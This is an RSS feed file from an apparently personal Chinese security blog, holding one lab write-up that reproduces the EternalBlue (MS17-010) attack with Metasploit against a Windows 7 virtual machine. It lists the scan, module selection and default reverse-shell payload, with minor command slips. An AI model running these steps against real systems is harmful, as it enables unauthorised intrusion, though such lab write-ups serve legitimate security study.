@@ -1,0 +1,221 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>渗透 on pan_0624的个人博客</title>
+        <link>http://blog.pan0624.top/tags/%E6%B8%97%E9%80%8F/</link>
+        <description>Recent content in 渗透 on pan_0624的个人博客</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>Example Person</copyright><atom:link href="http://blog.pan0624.top/tags/%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>MSF ms17-010复现</title>
+        <link>http://blog.pan0624.top/p/msf-ms17-010%E5%A4%8D%E7%8E%B0/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>http://blog.pan0624.top/p/msf-ms17-010%E5%A4%8D%E7%8E%B0/</guid>
+        <description>&lt;h1 id=&#34;渗透流程&#34;&gt;渗透流程&lt;/h1&gt;
+&lt;h2 id=&#34;环境准备&#34;&gt;环境准备&lt;/h2&gt;
+&lt;p&gt;使用vm
+靶机 windows7  2019.1 sp1 ==192.168.123.146==
+攻击机 kali 2023 amd64 ==192.168.123.236==
+win7 关闭所有防火墙，删除所有补丁，保证未处于公共网络&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/NrFZO6VQslnx2J8.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;
+&lt;img src=&#34;https://s2.loli.net/2023/09/25/seit3T9WEdPqObu.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;nmap-扫描靶机-msf-ms17-010复现&#34;&gt;Nmap 扫描靶机## MSF ms17-010复现&lt;/h2&gt;
+&lt;p&gt;正文内容&lt;/p&gt;
+&lt;p&gt;namp 192.168.123.236&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/QpSYe4aml7WkHEx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;发现445端口，smb服务开启，判断可能有永恒之蓝（ms17-010）漏洞&lt;/p&gt;
+&lt;h2 id=&#34;msf攻击&#34;&gt;MSF攻击&lt;/h2&gt;
+&lt;h3 id=&#34;进入msf并且查找ms17-010相关脚本&#34;&gt;进入MSF，并且查找ms17-010相关脚本&lt;/h3&gt;
+&lt;p&gt;msfconsole&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/wRdShngbWXIJAyM.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/nbM3zPcCKYRkp24.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;search ms17-010&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/i7Hx6JQyI4zvcjT.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;探测是否容易受到ms17-010攻击&#34;&gt;探测是否容易受到ms17-010攻击&lt;/h3&gt;
+&lt;p&gt;use 3
+show options&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/Os5cX4h8CWvEnQ6.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;填入靶机ip
+set RPORT 192.168.123.236&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/KSomx7u25pLqhTg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;开始探测
+run&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/laq7c2EBrP6KNj3.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;扫描结果显示容易受到攻击，判断存在漏洞&lt;/p&gt;
+&lt;h3 id=&#34;正式攻击&#34;&gt;正式攻击&lt;/h3&gt;
+&lt;p&gt;回到脚本选择界面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/EHxl2YJKBpvVU6I.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/NYfunj3U1y5qL9W.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;use 0
+show options
+这里同样只需要设置RHOST靶机ip
+payload选择默认的反弹shell即可&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/fhJPp6WtiDKN4VH.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;run&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/ngYGJiv39OI5K82.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;连接建立，shell反弹成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/qJ9EnG6RyMkwg5f.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;截图
+screenshot&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/sZkdqj7QHKRFc2r.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/uGbJ2PAhdzwQHrj.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://s2.loli.net/2023/09/25/Vg3zxWwfPerGUcE.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image|500&#34;
+	
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
